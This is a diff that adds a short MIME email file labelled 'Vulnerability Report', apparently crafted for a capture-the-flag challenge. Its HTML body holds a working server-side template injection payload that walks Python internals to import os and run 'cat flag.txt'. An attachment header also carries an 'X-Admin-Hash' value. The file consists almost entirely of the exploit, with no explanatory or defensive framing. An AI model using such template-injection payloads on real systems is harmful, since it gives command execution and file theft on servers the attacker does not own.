@@ -1,0 +1,21 @@
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----boundary"
+Subject: Vulnerability Report
+From: user@ses
+
+------boundary
+Content-Type: text/html
+
+<html>
+<body>
+    <h1>Report from {{ self.__init__.__globals__.__builtins__['__import__']('os').popen('cat flag.txt').read() }}</h1>
+</body>
+</html>
+
+------boundary
+Content-Type: text/plain
+Content-Disposition: attachment; filename="auth.txt"
+X-Admin-Hash: 2f4167548ca5a3bdafc23ef1513cd9fd
+
+Payload verification complete.
+------boundary--
